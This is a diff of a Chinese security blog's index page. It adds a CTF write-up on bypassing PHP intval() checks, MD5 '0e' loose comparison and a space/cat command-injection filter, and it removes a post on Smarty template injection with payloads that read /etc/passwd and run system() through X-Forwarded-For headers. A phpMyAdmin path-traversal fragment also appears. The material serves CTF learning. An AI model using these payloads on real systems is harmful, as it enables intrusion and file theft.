@@ -263,6 +263,92 @@
 
 
   
+    <article id="post-robots文件及inval函数和mad5绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/05/robots%E6%96%87%E4%BB%B6%E5%8F%8Ainval%E5%87%BD%E6%95%B0%E5%92%8Cmad5%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2021-09-04T16:00:00.000Z" itemprop="datePublished">2021-09-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/05/robots%E6%96%87%E4%BB%B6%E5%8F%8Ainval%E5%87%BD%E6%95%B0%E5%92%8Cmad5%E7%BB%95%E8%BF%87/">
+        robots.txt文件及inval函数和md5绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="robots文件及inval函数和md5绕过"><a href="#robots文件及inval函数和md5绕过" class="headerlink" title="robots文件及inval函数和md5绕过"></a>robots文件及inval函数和md5绕过</h1><p>打开页面，发现有bot文字出现，所以我们可以考虑是robots.txt文件，即访问限制的文件，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br></pre></td></tr></table></figure>
+<p>我们可以看见</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：/fAke_flagggg.php</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们访问/fAke_flagggg.php文件，发现flag{this_is_not_flag}，然后我们刷新再抓包，发现回显的包中有一个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Look_at_me：fl4g.php</span><br></pre></td></tr></table></figure>
+
+<p>然后去访问/fl4g.php文件，发现有源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>发现有三层的过滤</p>
+<p>第一层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(intval($num)&lt;2020 &amp;&amp; intval($num+1)&gt;2021)&#123;</span><br><span class="line"></span><br><span class="line">	echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中intval()函数为获取变量的整数值，所以intval()函数的参数如果输入科学计数法的字符串的话，会以e前面的数字返回值，而对于科学计数法+数字的话，会返回字符串类型，本地调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num=3e3;</span><br><span class="line">echo(intval($num));</span><br><span class="line">echo(&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">echo(intval($num+1);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这样就可以绕过这层过滤</p>
+<p>第二层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($md5==md5($md5))&#123;</span><br><span class="line">	echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以利用php弱类型进行绕过，就是当用==对两个md5的值进行比较时，如果md5的值的前两位为0e时，hash值会为0，致使两个不同的md5值相同，不过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e后面的必须是数字</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>
+<p>来进行绕过，然后写了一个简陋的exp来获取可以使用的数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for($k=0;$k&lt;=1000000000;$k++)&#123;</span><br><span class="line">	$i=&quot;0e&quot;.$k;</span><br><span class="line">	$j=substr(md5($i),0,2);</span><br><span class="line">	if($j==&quot;0e&quot;)&#123;</span><br><span class="line">		for($h=2;$h&lt;strlen(md5($i));$h++)&#123;</span><br><span class="line">			if(substr(md5($i),$h,1)&lt;&#x27;0&#x27; || substr(md5($i),$h,1)&gt;&#x27;9&#x27;)&#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	echo $h;      </span><br><span class="line">	if($h==strlen(md5($i)))&#123;</span><br><span class="line">		echo &quot;0e&quot;.$k;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>第三层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br></pre></td></tr></table></figure>
+<p>这里过滤了空格和cat，所以，我们可以用$IFS$9来代替空格，而tac来代替cat，所以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=2e5&amp;md5=0e215962017&amp;get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-unicode编码安全问题" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1175,88 +1261,6 @@ while count==1:
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php%253f/../../../按实际情况定/按实际情况定/tmp/tmp/sess_cookie中的phpmyadmin中的value值</span><br></pre></td></tr></table></figure>
 <p>而其中../以实际为主，要一个一个试</p>
 <p>详细请看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-1-0-0">https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-1-0-0</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-smart模板漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/31/smart%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E/" class="article-date">
-  	<time datetime="2021-08-30T16:00:00.000Z" itemprop="datePublished">2021-08-31</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/31/smart%E6%A8%A1%E6%9D%BF%E6%BC%8F%E6%B4%9E/">
-        smarty模板漏洞
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="smarty模板漏洞"><a href="#smarty模板漏洞" class="headerlink" title="smarty模板漏洞"></a>smarty模板漏洞</h1><p>打开主页，我们观察了各页面的内容，其中Your ip:让我们产生怀疑，会不会是SSTI漏洞，我们抓取一个包，然后构造X-Forwarded-For或client-ip这两个字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Foewarded-For: &#123;7*7&#125;</span><br><span class="line"></span><br><span class="line">client-ip: &#123;7*7&#125;</span><br></pre></td></tr></table></figure>
-<p>发现Your ip:会显示49，证明存在SSTI，而读取XFF和client-ip的api有些是使用smart引擎写的，因此我们可以猜测是smart模板漏洞，而常见是flask模板漏洞</p>
-<p>而smarty模板是基于PHP开发的，与flask模板有比较大的区别，我们可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure>
-<p>来确定smarty模板的版本</p>
-<h2 id="常见的利用方法"><a href="#常见的利用方法" class="headerlink" title="常见的利用方法"></a>常见的利用方法</h2><h3 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h3><p>smarty模板支持使用的{php}{/php}标签来执行被包裹的php指令，但在smart3版本中已经废弃了{php}{/php}标签，但是在smarty3.1中的smartyBC中仍然可以使用</p>
-<h3 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h3><p>{literal}可以让一个模板区域的字符原样输出，这经常保护页面上的javascript或css样本表，避免因为smarty的定界符错被解析</p>
-<p>对于php5的话，可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt; phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>来实现php代码的执行</p>
-<h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>通过self来获取smarty类的静态方法来实现文件读写<br>smarty类中的getStreamVariable方法的代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function getStreamVariable($variable)&#123; $_result = &#x27;&#x27;; $fp = fopen($variable, &#x27;r+&#x27;); if ($fp) &#123; while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123; $_result .= $current_line; &#125; fclose($fp); return $_result; &#125; $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this; if ($smarty-&gt;error_unassigned) &#123; throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;); &#125; else &#123; return null; &#125; &#125;</span><br></pre></td></tr></table></figure>
-
-<p>getStreamVariable()方法是读取一个文件并返回其内容，所以我们可以用self来获取smarty类对象并调用这个方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
-<p>但这是旧版本的smarty模板的利用方法，新版本不能用，而smarty3.1.30版本开始，这个方法已经被删除，而Smarty_Internal_File类中的writeFile方法来写shell也已经被高版本删除</p>
-<h3 id="if"><a href="#if" class="headerlink" title="{if}"></a>{if}</h3><p>smarty模板的{if}标签和php的if很像，只是增加了一些特性，每个{if}要配备一个{/if}，也可以匹配{else}和{elseif}，全部的php条件表达式和函数都可以在if内使用，如or,and等</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
-<p>即可显示php版本</p>
-<p>回到题目本身，我可以在bp抓的包中构造XFF或client-ip来获取flag或想要的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if system(&quot;cat flag&quot;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line">client-ip: &#123;if system(&quot;cat flag&quot;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
-
-<p>详细请看：<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/219913.html">https://www.freebuf.com/column/219913.html</a></p>
 
       
     </div>
